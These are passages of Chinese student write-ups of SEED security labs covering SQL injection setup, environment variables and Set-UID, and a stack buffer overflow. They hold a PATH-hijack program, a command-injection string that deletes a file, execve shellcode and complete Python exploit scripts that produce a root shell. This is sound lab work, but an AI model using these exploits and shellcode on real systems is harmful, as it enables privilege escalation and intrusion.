\u003ccode\u003eetc/hosts\u003c/code\u003e 目录下，其中 \u003ccode\u003ewww.seed-server.com\u003c/code\u003e 是Web程序的域名，\u003ccode\u003e10.9.0.5\u003c/code\u003e 是容器的IP\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"m\"\u003e10.9.0.5\u003c/span\u003e\u003cspan class=\"w\"\u003e\t\u003c/span\u003e\u003cspan class=\"l\"\u003ewww.seed-server.com\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"构建并启动docker\"\u003e构建并启动docker\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e在\u003ccode\u003eLabsetup\u003c/code\u003e下使用命令 \u003ccode\u003edocker-compose build\u003c/code\u003e 构建docker\u003c/li\u003e\n\u003c/ol\u003e\n\u003cimg src=\"https://s2.loli.net/2024/10/23/DAYObt7uPgqWsBv.png\" alt=\"image-20241023085326893\" style=\"zoom: 50%;\" /\u003e\r\n\u003col start=\"2\"\u003e\n\u003cli\u003e使用命令 \u003ccode\u003edocker-compose up\u003c/code\u003e 拉起容器，容器中的 \u003ccode\u003e/var/lib/mysql\u003c/code\u003e 挂载在 \u003ccode\u003eLabsetup\u003c/code\u003e 目录下。\u003c/li\u003e\n\u003c/ol\u003e\n\u003cimg src=\"https://s2.loli.net/2024/10/23/mHyO4TSWMEpYlxJ.png\" alt=\"image-20241023090817956\" style=\"zoom: 33%;\" /\u003e\r\n\u003ch2 id=\"task-1熟悉-sql-语句\"\u003eTask 1：熟悉 SQL 语句\u003c/h2\u003e\n\u003ch3 id=\"进入容器shell并使用mysql客户端与数据库进行交互\"\u003e进入容器shell并使用mysql客户端与数据库进行交互\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocker ps\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edocksh a3\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emysql -u root -pdees\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://s2.loli.net/2024/10/23/vLGOnWEDS6B5wsf.png\" alt=\"image-20241023092314024\"  /\u003e\n\u003c/p\u003e","title":"SEEDlab—SQL注入攻击实验"},{"content":"Task 1：配置环境变量 使用printenv或env指令来打印环境变量： ​\t如果只想打印特定的环境变量，如PWD变量，可以使用printenv PWD或者env | grep PWD\n使用export和unset来设置或者取消环境变量 使用export设置环境变量： ​\t比如现在我使用export设置一个环境变量MY_VAR的值为softwaresecurity\n​\t可以使用echo $MY_VAR打印出这个环境变量的值。\n使用unset取消环境变量： ​\t取消变量MY_VAR。\nTask 2：从父进程向子进程传递环境变量 编译myprintenv.c并运行，将输出结果打印到文件output1.txt中。 注释掉子进程中的printenv()，并取消注释父进程的printenv()，再次编译并打印输出到文件output2.txt。 使用diff命令比较两个文件的差异。 ​\t结论：由于我在不同的窗口下运行的a.out和b.out，因此父子进程只有编译成的可执行文件名称和命令行窗口这两个环境变量不同，其余的环境变量都是相同的。结论是子进程在继承父进程的环境变量时，除了文件名和输出窗口存在差异以外，其他的环境变量都是相同的。\nTask 3：环境变量和execve() 编译并运行myenv.c 发现输出为空。\n修改execve()函数为execve(\u0026quot;/usr/bin/env\u0026quot;,argv,environ); 发现打印出了当前进程的环境变量。\n结论：\nexecve()函数的原型是：\nint execve(const char *pathname, char *const argv[], char *const envp[]); pathname: 要执行的程序的路径。 argv: 参数数组，以 NULL 结尾，包含传递给程序的命令行参数。 envp: 环境变量数组，也以 NULL 结尾。 新程序通过execve()函数的第三个参数传递的environ变量来获取环境变量。\nTask 4：环境变量和system() 编译并运行如下代码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { system(\u0026#34;/usr/bin/env\u0026#34;); return 0; } 我们使用man system查看函数的手册：\n可以看到system()函数是通过创建一个子进程，执行execl(\u0026quot;/bin/sh\u0026quot;, \u0026quot;sh\u0026quot;, \u0026quot;-c\u0026quot;, command, (char *) NULL);，调用进程的环境变量会传递给新程序/bin/sh。\nTask 5：环境变量和Set-UID程序 编写以下程序打印该进程所有的环境变量： #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; extern char **environ; void main() { int i = 0; while (environ[i] != NULL) { printf(\u0026#34;%s\\n\u0026#34;, environ[i]); i++; } } 编译上述程序得到 foo，将其所有者更改为 root，并使其成为一个 Set-UID 程序 // Asssume the program’s name is foo $ sudo chown root foo $ sudo chmod 4755 foo 查看一下foo的权限，发现所有者更改为了root。\n设置以下环境变量： PATH LD_LIBRARY_PATH MY_NAME 然后运行foo并查看这些环境变量的值\n发现只有在父进程中设置的PATH和MY_NAME的环境变量进入子进程，而LD_LIBRARY_PATH这个环境变量没有进入子进程。\n原因： LD_LIBRARY_PATH这个环境变量设置的是动态链接器的地址，由于动态链接器的保护机制，虽然在一个root权限的程序下创建子进程并继承父进程的环境变量，但由于我们是在普通用户下修改的LD_LIBRARY_PATH这个环境变量，所以是无法在子进程中生效的，而PATH和MY_NAME则没有这种保护机制，因此可以被成功设置。\nTask 6：PATH环境变量和Set-UID程序 先使用以下命令将bin/sh链接到bin/zsh，以规避bin/dash阻止Set-UID程序使用特权执行的策略。\nsudo ln -sf /bin/zsh /bin/sh 然后编写LS.c文件，如下所示：\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main(){ system(\u0026#34;ls\u0026#34;); return 0; } 然后编译，并设置为Set-UID程序：\n可以看出，编译出来的LS文件确实执行了system(\u0026quot;ls\u0026quot;)的操作，更改后的文件所有者确实变成了root\n现在我们在普通用户下设置PATH环境变量，使用export PATH=/home/seed:$PATH将/home/seed 添加到环境变量的开头：\n然后我们在/home/seed下编写我们的恶意代码。\n// hack.c #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; int main(){ uid_t euid = geteuid(); //获取执行恶意代码的进程的euid printf(\u0026#34;euid=%d\\n\u0026#34;, euid); printf(\u0026#34;You have been hacked!!!!\\n\u0026#34;); return 0; } 然后编译并命名成ls：\ngcc hack.c -o ls 然后再执行我们的LS文件：\n发现可以使用Set-UID程序运行我们的恶意代码，并且根据system(\u0026quot;id\u0026quot;)的结果来看：euid=0表示当前进程具有root权限，表明恶意代码是以root权限运行的。\nTask 7：LD_PRELOAD环境变量和Set-UID程序 观察环境变量在运行普通程序时如何影响动态加载器/链接器的行为，首先要进行如下配置： 构建一个动态链接库，命名为mylib.c，里面基本上覆盖了libc里的sleep()函数： #include \u0026lt;stdio.h\u0026gt; void sleep (int s) { /* If this is invoked by a privileged program , you can do damages here! */ printf(\u0026#34;I am not sleeping!\\n\u0026#34;); } 编译该程序： gcc -fPIC -g -c mylib.c gcc -shared -o libmylib.so.1.0.1 mylib.o -lc 设置LD_PRELOAD环境变量的值： export LD_PRELOAD=./libmylib.so.1.0.1 编译下面的程序myprog.c /* myprog.c */ #include \u0026lt;unistd.h\u0026gt; int main() { sleep(1); return 0; } 完成上述操作后，请在以下条件下运行 myprog，观察会发生什么。 使 myprog 为一个普通程序，以普通用户身份执行它。 发现执行的是我们编写的sleep函数。\n使 myprog 为一个 Set-UID 特权程序，以普通用户身份执行它。 发现等待了一秒后，没有输出，说明执行的是libc中的sleep()函数。\n使 myprog 为一个 Set-UID 特权程序，在 root 下重新设置 LD_PRELOAD 环境变量，并执行它。 发现执行的是我们编写的sleep函数。\n使myprog成为一个Set_UID user1程序，在另一个用户帐户（非root用户）中再次改变LD_PRELOAD环境变量并运行它 发现等待了一秒后，没有输出，说明执行的是libc中的sleep()函数。\n设计一个实验来找出导致这些差异的原因，并解释为什么第二步的行为不同。 修改一下myprog.c，打印这个程序运行时的进程的uid、euid以及LD_PRELOAD环境变量的值，如下所示：\n/* myprog.c */ #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; extern char **environ; int main() { sleep(1); uid_t uid = getuid(); printf(\u0026#34;uid=%d(%s) \u0026#34;, uid, getenv(\u0026#34;USER\u0026#34;)); uid_t euid = geteuid(); printf(\u0026#34;euid=%d\\n\u0026#34;, euid); char *preload = getenv(\u0026#34;LD_PRELOAD\u0026#34;); printf(\u0026#34;LD_PRELOAD: %s\\n\u0026#34;, preload); return 0; } 然后编写一个shell脚本，用于测试四种情况的输出以及当前进程的id，如下所示：\n#test.sh echo \u0026#34;seed,run in seed:\u0026#34; sudo chown seed myprog sudo chmod 4755 myprog export LD_PRELOAD=./libmylib.so.1.0.1 ./myprog echo \u0026#34;root,run in seed:\u0026#34; sudo chown root myprog sudo chmod 4755 myprog ./myprog echo \u0026#34;root,run in root:\u0026#34; sudo su \u0026lt;\u0026lt;EOF export LD_PRELOAD=./libmylib.so.1.0.1 ./myprog EOF echo \u0026#34;user1,run in seed:\u0026#34; sudo chown user1 myprog sudo chmod 4755 myprog export LD_PRELOAD=./libmylib.so.1.0.1 ./myprog 这个脚本可以自动化测试四种情况下的sleep()函数的执行情况以及打印当前进程的id，运行结果如下：\n我们发现：\n当myprog为一个普通程序，以普通用户身份执行它时，其uid为seed，euid也为seed，LD_PRELOAD环境变量继承了父进程的，并且执行的是我们编写的sleep函数。\n当myprog为一个Set-UID程序时，以普通用户身份执行它时，其uid为seed，euid为root，LD_PRELOAD环境变量没有继承父进程的，并且执行的是libc的sleep函数。\n当myprog为一个Set-UID程序时，以root用户身份执行它时，其uid为root，euid为root，LD_PRELOAD环境变量继承了父进程的，并且执行的是我们编写的sleep函数。\n当myprog为一个Set-UID user1程序时，以普通用户身份执行它时，其uid为seed，euid为user1，LD_PRELOAD环境变量没有继承父进程的，并且执行的是libc的sleep函数。\n如下表所示：\n程序类型 执行用户 uid euid LD_PRELOAD环境变量 执行的sleep函数 普通程序 seed seed seed 继承父进程 我们编写的 Set-UID程序 seed seed root 没有继承父进程 libc的 Set-UID程序 root root root 继承父进程 我们编写的 Set-UID user1程序 seed seed user1 没有继承父进程 libc的 结论：\n当一个进程的uid和euid一致时，子进程才会继承父进程的环境变量，才会执行我们编写的sleep()函数，第二步行为不同的原因是因为它们的uid和euid的一致/不一致会导致子进程继承/不继承LD_PRELOAD环境变量，从而导致了sleep()函数的不同。\nTask 8：使用 system() 与 execve() 调用外部程序的对比 编写并编译catcall.c，如下所示：\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char *argv[]) { char *v[3]; char *command; if(argc \u0026lt; 2) { printf(\u0026#34;Please type a file name.\\n\u0026#34;); return 1; } v[0] = \u0026#34;/bin/cat\u0026#34;; v[1] = argv[1]; v[2] = NULL; command = malloc(strlen(v[0]) + strlen(v[1]) + 2); sprintf(command , \u0026#34;%s %s\u0026#34;, v[0], v[1]); system(command); // execve(v[0], v, NULL); return 0 ; } 这个程序调用了system()函数执行了/bin/cat [filename]，可以打印指定文件的内容。\n编译上述程序，使其成为 root 所有的 Set-UID 程序。该程序将使用 system() 来调用该命令。如果你是 Bob，你能损害系统的完整性吗？例如，你可以删除对你没有写权限的文件吗？\n首先使其成为root所有的 Set-UID 程序： 尝试删除没有写权限的文件：\n首先创建一个seed没有写权限的文件，我们首先要将文件夹权限改为seed不可写，再将test.txt的属性设为seed不可写： 发现catcall有命令注入漏洞，可以调用system()执行其他系统命令： ​\t使用命令catcall \u0026quot;test.txt;rm test.txt\u0026quot;成功将没有写权限的test.txt删除。\n注释掉 system(command) 语句，取消注释 execve() 语句；程序将使用 execve() 来调用命令。 编译程序，并使其成为 root 拥有的 Set-UID 程序。你在第一步中的攻击仍然有效吗？请描述并解释你的观察结果。\n首先创建一个seed没有写权限的文件： 然后再使用命令catcall \u0026quot;test.txt;rm test.txt\u0026quot; ​\t发现无法删除test.txt，攻击失效。\n原理：\n使用system()函数能成功删除的原因是system()函数会创建一个子进程，并调用bin/bash来执行函数的参数，因此执行catcall \u0026quot;test.txt;rm test.txt\u0026quot;就相当于父进程创建了一个子进程，子进程使用bin/bash执行bin/cat test.txt;rm test.txt ，由于bash的特性，分号后面会作为下一个命令并执行，而且父进程是一个Set-UID程序，因此相当于在 root 下执行了rm test.txt，所以可以删除文件。\n而使用execve()函数删除不了文件的原因是execve()函数并不是调用bin/bash来执行函数的参数的，而是通过系统调用的方式执行bin/cat test.txt;rm test.txt，它会把 test.txt;rm test.txt 当作一个文件名，而我们这个目录下并不存在这个文件，因此会报错/bin/cat: 'test.txt;rm test.txt': No such file or directory\nTask 9：权限泄漏 编译以下程序，将其所有者更改为 root，并使其成为 Set-UID 程序。\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; void main() { int fd; char *v[2]; /* Assume that /etc/zzz is an important system file, * and it is owned by root with permission 0644. * Before running this program, you should create * the file /etc/zzz first. */ fd = open(\u0026#34;/etc/zzz\u0026#34;, O_RDWR | O_APPEND); if (fd == -1) { printf(\u0026#34;Cannot open /etc/zzz\\n\u0026#34;); exit(0); } // Print out the file descriptor value printf(\u0026#34;fd is %d\\n\u0026#34;, fd); // Permanently disable the privilege by making the // effective uid the same as the real uid setuid(getuid()); // Execute /bin/sh v[0] = \u0026#34;/bin/sh\u0026#34;; v[1] = 0; execve(v[0], v, 0); } 我们在/etc下创建文件zzz，并运行cap_leak\n文件描述符（File Descriptor，简称 fd）是操作系统中用于管理和操作文件或其他输入/输出资源（如网络连接、管道等）的一个重要概念。当打开一个文件时，操作系统会返回一个文件描述符，后续的读写操作都通过这个描述符进行。\n此时输出了zzz文件的文件描述符fd（File Descriptor），并且执行了setuid(getuid())操作，将进程的uid改为了当前用户的，也就是将uid设为seed，然后调用execve()函数执行了bin/sh开启了一个shell。\n我们使用whoami命令查看shell的拥有者：\n发现拥有者确实是seed，但是虽然这个进程的有效用户ID是 seed ，但是该进程仍然拥有特权，我们可以以普通用户的身份将恶意代码写入/etc/zzz文件中，这个过程需要利用文件描述符fd。\n我们可以使用echo \u0026quot;You have been hacked!!\u0026quot; \u0026gt;\u0026amp; 3，将这段话通过文件描述符写入/etc/zzz：\n可以发现成功写入了文件。\n原理：\n虽然代码中执行了setuid(getuid())操作，将进程的uid改为了seed，但是在执行execve(v[0], v, 0) 打开一个shell时，由于在放弃特权时没有关闭/etc/zzz这个文件，创建的子进程会继承/etc/zzz这个文件的文件描述符，造成特权泄露，子进程可以利用这个文件描述符向文件中写入内容。\n","permalink":"https://smera1d0.github.io/posts/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C1-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8E-set-uid-%E5%AE%9E%E9%AA%8C/","summary":"\u003ch2 id=\"task-1配置环境变量\"\u003eTask 1：配置环境变量\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003e使用\u003ccode\u003eprintenv\u003c/code\u003e或\u003ccode\u003eenv\u003c/code\u003e指令来打印环境变量：\u003c/li\u003e\n\u003c/ol\u003e\n\u003cimg src=\"https://s2.loli.net/2024/12/07/g6ZbY3wNelFK9EV.png\" alt=\"image-20240925085104482\" style=\"zoom:50%;\" /\u003e\r\n\u003cimg src=\"https://s2.loli.net/2024/12/07/k6b389YmWV5TSfM.png\" alt=\"image-20240925085246669\" style=\"zoom:50%;\" /\u003e\r\n\u003cp\u003e​\t如果只想打印特定的环境变量，如\u003ccode\u003ePWD\u003c/code\u003e变量，可以使用\u003ccode\u003eprintenv PWD\u003c/code\u003e或者\u003ccode\u003eenv | grep PWD\u003c/code\u003e\u003c/p\u003e","title":"SEEDlab—环境变量与 Set-UID 实验"},{"content":"环境设置 关闭反制措施 地址空间布局随机化 地址空间布局随机化：Linux操作系统的使用随机的地址来设置堆栈的起始地址，使得攻击者很难猜测出确切的堆栈起始地址。\n使用命令sudo sysctl -w kernel.randomize_va_space=0来关闭地址空间布局随机化。\n配置/bin/sh zsh：Zsh（Z-shell）是一款用于交互式使用的shell，也可以作为脚本解释器来使用。其包含了bash，ksh，tcsh等其他shell中许多优秀功能，也拥有诸多自身特色。\n由于/bin/sh的符号链接指向/bin/dash，而/bin/dash有一种安全机制，我们需要将/bin/sh链接到我们安装的/bin/zsh上。\n使用命令：\nsudo ln -sf /bin/zsh /bin/sh Task1：熟悉shellcode C语言版本的shellcode #include \u0026lt;stdio.h\u0026gt; int main(){ char *name[2]; name[0] = \u0026#34;/bin/sh\u0026#34;; name[1] = NULL; execve(name[0], name, NULL); } 编译并设置所有者为root：\ngcc cshellcode.c -o cshellcode\rsudo chown root cshellcode\rsudo chmod 4755 cshellcode\r./cshellcode 发现成功进入了root shell。\n32bit shellcode ; Store the command on stack\rxor eax, eax\rpush eax\rpush \u0026#34;//sh\u0026#34;\rpush \u0026#34;/bin\u0026#34;\rmov ebx, esp ; ebx --\u0026gt; \u0026#34;/bin//sh\u0026#34;: execve()\u0026#39;s 1st argument\r; Construct the argument array argv[]\rpush eax ; argv[1] = 0\rpush ebx ; argv[0] --\u0026gt; \u0026#34;/bin//sh\u0026#34;\rmov ecx, esp ; ecx --\u0026gt; argv[]: execve()\u0026#39;s 2nd argument\r; For environment variable\rxor edx, edx ; edx = 0: execve()\u0026#39;s 3rd argument\r; Invoke execve()\rxor eax, eax ;\rmov al, 0x0b ; execve()\u0026#39;s system call number\rint 0x80 这段汇编代码通过将execve()函数的参数依次压入栈中，并通过ebx、ecx、edx三个寄存器向execve()传递参数，当我们将al的值设为0x0b，并执行int 0x80时，就会执行execve系统调用。\n64bit shellcode xor rdx, rdx ; rdx = 0: execve()\u0026#39;s 3rd argument\rpush rdx\rmov rax, \u0026#39;/bin//sh\u0026#39; ; the command we want to run\rpush rax ;\rmov rdi, rsp ; rdi --\u0026gt; \u0026#34;/bin//sh\u0026#34;: execve()\u0026#39;s 1st argument\rpush rdx ; argv[1] = 0\rpush rdi ; argv[0] --\u0026gt; \u0026#34;/bin//sh\u0026#34;\rmov rsi, rsp ; rsi --\u0026gt; argv[]: execve()\u0026#39;s 2nd argument\rxor rax, rax\rmov al, 0x3b ; execve()\u0026#39;s system call number\rsyscall 调用shellcode 在shellcode文件夹中，已经帮我们写好了Makefile文件，如下所示：\nall: gcc -m32 -z execstack -o a32.out call_shellcode.c gcc -z execstack -o a64.out call_shellcode.c setuid: gcc -m32 -z execstack -o a32.out call_shellcode.c gcc -z execstack -o a64.out call_shellcode.c sudo chown root a32.out a64.out sudo chmod 4755 a32.out a64.out clean: rm -f a32.out a64.out *.o 使用命令make all，会编译c源代码，生成a32.out和a64.out，执行发现会进入seed权限的shell\n使用命令make setuid，会编译c源代码，并将两个可执行文件设置为setuid文件，执行后发现进入root权限的shell\nTask2：理解漏洞程序 源码解释 在code目录下有一个stack.c，如下所示：\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; /* Changing this size will change the layout of the stack. * Instructors can change this value each year, so students * won\u0026#39;t be able to use the solutions from the past. */ #ifndef BUF_SIZE #define BUF_SIZE 100 #endif void dummy_function(char *str); int bof(char *str) { char buffer[BUF_SIZE]; // The following statement has a buffer overflow problem strcpy(buffer, str); return 1; } int main(int argc, char **argv) { char str[517]; FILE *badfile; badfile = fopen(\u0026#34;badfile\u0026#34;, \u0026#34;r\u0026#34;); if (!badfile) { perror(\u0026#34;Opening badfile\u0026#34;); exit(1); } int length = fread(str, sizeof(char), 517, badfile); printf(\u0026#34;Input size: %d\\n\u0026#34;, length); dummy_function(str); fprintf(stdout, \u0026#34;==== Returned Properly ====\\n\u0026#34;); return 1; } // This function is used to insert a stack frame of size // 1000 (approximately) between main\u0026#39;s and bof\u0026#39;s stack frames. // The function itself does not do anything. void dummy_function(char *str) { char dummy_buffer[1000]; memset(dummy_buffer, 0, 1000); bof(str); } 该程序定义了一个常量BUF_SIZE=100，意味着缓冲区的大小为100 strcpy()函数没有边界检查功能，因此如果传入的str的大小超过缓冲区大小就会造成缓冲区溢出 在main函数里，会从badfile文件中读取一个输入，并将输入传入缓冲区 编译 在编译时我们需要使用-fno-stack-protector和-z execstack参数关闭 StackGuard 和不可执行栈的保护机制，这些已经写到Makefile中了，只需make即可。\nTask3：对 32-bit 程序实施攻击 (Level 1) 确定地址 在使用gcc编译时加入-g参数，可以将调试信息加入到二进制文件中，我们使用gdb对二进制文件进行调试。\n首先我们使用b bof在bof()函数处下断点 然后使用run命令运行程序到断点处，如下图所示： 我们可以看到汇编代码部分，下面详细解释：\n=\u0026gt; 0x565562ad \u0026lt;bof\u0026gt;:\tendbr32 0x565562b1 \u0026lt;bof+4\u0026gt;:\tpush ebp\r0x565562b2 \u0026lt;bof+5\u0026gt;:\tmov ebp,esp\r0x565562b4 \u0026lt;bof+7\u0026gt;:\tpush ebx\r0x565562b5 \u0026lt;bof+8\u0026gt;:\tsub esp,0x84 ebp：ebp（Extended Base Pointer）是x86架构中的一个寄存器，通常用于函数调用中的栈帧管理。它的主要用途是在程序执行过程中充当基址指针，具体来说，EBP在函数调用时保存了调用者的栈帧基址，并被用来创建当前函数的栈帧。\nesp：esp（Extended Stack Pointer）是x86架构中的一个寄存器，用于指向当前栈顶的位置。它是栈指针寄存器，用于管理栈的操作，特别是在函数调用和返回时对栈进行操作。\n可以发现esp的值还没赋给ebp，因此此时我们获取的值是函数调用者的地址。\n使用p $ebp打印 ebp 寄存器的地址：\ngdb-peda$ p $ebp $1 = (void *) 0xffffcf88 而我们想获得bof()函数的基址，需要先让程序执行到0x565562b2 \u0026lt;bof+5\u0026gt;:\tmov ebp,esp这步之后ebp中存储的地址才是bof()函数的基址。\n使用next命令进行单步调试，此时再使用p $ebp打印 ebp 寄存器的地址，才是bof()函数的基址。\ngdb-peda$ p $ebp $2 = (void *) 0xffffcb78 此时再使用p \u0026amp;buffer来获取缓冲区的起始地址\ngdb-peda$ p \u0026amp;buffer $3 = (char (*)[120]) 0xffffcaf8 生成shellcode 我们需要将前面提到的32bit的shellcode转为机器码，如下所示：\n\\x31\\xc0 // xor eax,eax\r\\x50 // push eax\r\\x68\\x2f\\x2f\\x73\\x68 // push 0x68732f2f (\u0026#34;//sh\u0026#34;)\r\\x68\\x2f\\x62\\x69\\x6e // push 0x6e69622f (\u0026#34;/bin\u0026#34;)\r\\x89\\xe3 // mov ebx,esp\r\\x50 // push eax\r\\x53 // push ebx\r\\x89\\xe1 // mov ecx,esp\r\\x31\\xd2 // xor edx,edx\r\\x31\\xc0 // xor eax,eax\r\\xb0\\x0b // mov al,0xb\r\\xcd\\x80 // int 0x80 所以shellcode就可以写为：\nshellcode= ( \u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\x31\\xc0\\xb0\\x0b\\xcd\\x80\u0026#34; ).encode(\u0026#39;latin-1\u0026#39;) 布置shellcode 为了实现缓冲区溢出攻击，我们需要精心设计shellcode的位置以及覆盖原有函数的地址，使shellcode可以执行并返回。\n我们选择在离返回地址较近的地方来布置我们的shellcode，由于content的长度为517，我们的shellcode长度为27，所以我们选择在450位置写入shellcode\n# Put the shellcode somewhere in the payload start = 450 # Change this number content[start:start + len(shellcode)] = shellcode 覆盖返回地址 首先要计算我们布置的shellcode的地址，将这个作为返回地址： $$ ret=\u0026amp;buffer(缓冲区起始地址)+start(shellcode在缓冲区里的位置) $$\n然后我们需要将这个返回地址写入溢出的某个位置，使其正好覆盖bof()函数的返回地址，如下： +-----------------+\r| retaddr |\r+-----------------+\r| 4bit |\rebp---\u0026gt;+-----------------+\r| |\r| |\r| |\r| |\r| |\r| |\r\u0026amp;buffer--\u0026gt;+-----------------+ 不难计算出，bof函数的返回地址在缓冲区中的偏移offset： $$ offset=$ebp-\u0026amp;buffer+4 $$\n编写exp #!/usr/bin/python3 import sys # Replace the content with the actual shellcode shellcode= ( \u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\x31\\xc0\\xb0\\x0b\\xcd\\x80\u0026#34; ).encode(\u0026#39;latin-1\u0026#39;) # Fill the content with NOP\u0026#39;s content = bytearray(0x90 for i in range(517)) ################################################################## # Put the shellcode somewhere in the payload start = 450 # Change this number content[start:start + len(shellcode)] = shellcode # Decide the return address value # and put it somewhere in the payload ret = 0xffffcaf8+start # Change this number offset = 0xffffcb78-0xffffcaf8+4 # Change this number L = 4 # Use 4 for 32-bit address and 8 for 64-bit address content[offset:offset + L] = (ret).to_bytes(L,byteorder=\u0026#39;little\u0026#39;) ################################################################## # Write the content to a file with open(\u0026#39;badfile\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(content) 执行我们的exp，并执行写入shellcode后的程序：\n攻击成功，获得了root shell。\nTask4：在不知道缓冲区大小的情况下实施攻击 (Level 2) 在不知道缓冲区大小的情况下，我们假设你知道缓冲区大小的范围是 100∼200 字节，所以我们可以将buffer的前204位置全部设置为ret的地址，这样只要发生缓冲区溢出，且溢出可以覆盖返回地址，我们就可以成功进行攻击。\n# Put the shellcode somewhere in the payload start = 400 # Change this number content[start:start + len(shellcode)] = shellcode 使用gdb调试，找到函数的起始地址和缓冲区的起始地址：\ngdb-peda$ p $ebp $1 = (void *) 0xffffcb88 gdb-peda$ p \u0026amp;buffer $2 = (char (*)[180]) 0xffffcacc 编写exp：\n#!/usr/bin/python3 import sys # Replace the content with the actual shellcode shellcode= ( \u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\u0026#34; \u0026#34;\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\u0026#34; \u0026#34;\\xd2\\x31\\xc0\\xb0\\x0b\\xcd\\x80\u0026#34; ).encode(\u0026#39;latin-1\u0026#39;) # Fill the content with NOP\u0026#39;s content = bytearray(0x90 for i in range(517)) ################################################################## # Put the shellcode somewhere in the payload start = 400 # Change this number content[start:start + len(shellcode)] = shellcode # Decide the return address value # and put it somewhere in the payload ret = 0xffffcacc+start # Change this number #ret = 0x55555555522e offset = 0xffffcb88-0xffffcacc+4 # Change this number L = 4 # Use 4 for 32-bit address and 8 for 64-bit address content[0:offset + L] = (ret).to_bytes(L,byteorder=\u0026#39;little\u0026#39;) *(204//4) #将前204位全部填充ret ################################################################## # Write the content to a file with open(\u0026#39;badfile\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(content) 执行exp，并执行写入shellcode后的可执行文件stack-L2\n发现成功进入root shell，并且只需要一次，无需爆破。\nTask5：对 64-bit 程序实施攻击 (Level 3) 由于程序是通过strcpy()将badfile读取到buffer里的，因此我们的shellcode中不能出现\\x00，因为这样会导致strcpy截断，同时写入的返回地址的前两位总是00，由于地址在栈中是以小端序存储的，因此我们只要将返回地址写到badfile的最后位置就行，这样就可以读取到完整的shellcode。\n首先使用gdb调试获取缓冲区起始地址和函数返回地址：\n[----------------------------------registers-----------------------------------] RAX: 0x7fffffffddf0 --\u0026gt; 0x9090909090909090 RBX: 0x555555555360 (\u0026lt;__libc_csu_init\u0026gt;:\tendbr64) RCX: 0x7fffffffddc0 --\u0026gt; 0x0 RDX: 0x7fffffffddc0 --\u0026gt; 0x0 RSI: 0x0 RDI: 0x7fffffffddf0 --\u0026gt; 0x9090909090909090 RBP: 0x7fffffffd9c0 --\u0026gt; 0x7fffffffddd0 --\u0026gt; 0x7fffffffe010 --\u0026gt; 0x0 RSP: 0x7fffffffd8c0 --\u0026gt; 0x7ffff7ffd9e8 --\u0026gt; 0x7ffff7fcf000 --\u0026gt; 0x10102464c457f RIP: 0x55555555523f (\u0026lt;bof+22\u0026gt;:\tmov rdx,QWORD PTR [rbp-0xf8]) R8 : 0x0 R9 : 0x10 R10: 0x55555555602c --\u0026gt; 0x52203d3d3d3d000a (\u0026#39;\\n\u0026#39;) R11: 0x246 R12: 0x555555555140 (\u0026lt;_start\u0026gt;:\tendbr64) R13: 0x7fffffffe100 --\u0026gt; 0x1 R14: 0x0 R15: 0x0 EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow) [-------------------------------------code-------------------------------------] 0x55555555522e \u0026lt;bof+5\u0026gt;:\tmov rbp,rsp 0x555555555231 \u0026lt;bof+8\u0026gt;:\tsub rsp,0x100 0x555555555238 \u0026lt;bof+15\u0026gt;:\tmov QWORD PTR [rbp-0xf8],rdi =\u0026gt; 0x55555555523f \u0026lt;bof+22\u0026gt;:\tmov rdx,QWORD PTR [rbp-0xf8] 0x555555555246 \u0026lt;bof+29\u0026gt;:\tlea rax,[rbp-0xf0] 0x55555555524d \u0026lt;bof+36\u0026gt;:\tmov rsi,rdx 0x555555555250 \u0026lt;bof+39\u0026gt;:\tmov rdi,rax 0x555555555253 